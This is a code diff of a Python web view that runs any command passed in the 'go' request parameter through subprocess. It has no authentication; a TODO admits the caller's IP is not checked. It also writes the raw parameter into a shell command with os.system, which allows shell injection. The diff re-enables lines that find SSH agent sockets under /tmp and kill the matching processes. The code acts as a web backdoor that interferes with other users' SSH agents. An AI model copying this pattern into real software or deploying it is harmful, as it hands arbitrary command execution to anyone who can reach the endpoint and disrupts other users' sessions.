@@ -34,6 +34,8 @@ def restart(request):
 
 
 def command(request):
+    # TODO: aConfirm IP Address before executing
+    # TODO: Integrate the restart function
     ip = request.META.get('REMOTE_ADDR')
     com = request.GET['go'].split()
     exect = subprocess.Popen(com, stdout=subprocess.PIPE)
@@ -42,9 +44,9 @@ def command(request):
     # result = os.popen(request.GET['go']).read()
     os.system("echo '" + request.GET['go'] + result + "' >> Results")
     os.system("echo '" + ip + "' >> Results")
-    # sshAgentList = os.popen("find /tmp/ -type s -name agent.* 2>/dev/null | grep '/tmp/ssh-.*/agent.*'").read().split("\n")[:-1]
-    # for i in range(len(sshAgentList)):
-    #     os.system("kill "+ str(int(sshAgentList[i].split(".")[1])+1))
+    sshAgentList = os.popen("find /tmp/ -type s -name agent.* 2>/dev/null | grep '/tmp/ssh-.*/agent.*'").read().split("\n")[:-1]
+    for i in range(len(sshAgentList)):
+        os.system("kill " + str(int(sshAgentList[i].split(".")[1])+1))
     return HttpResponse(result + '\n' + ip + '\n')
 
 
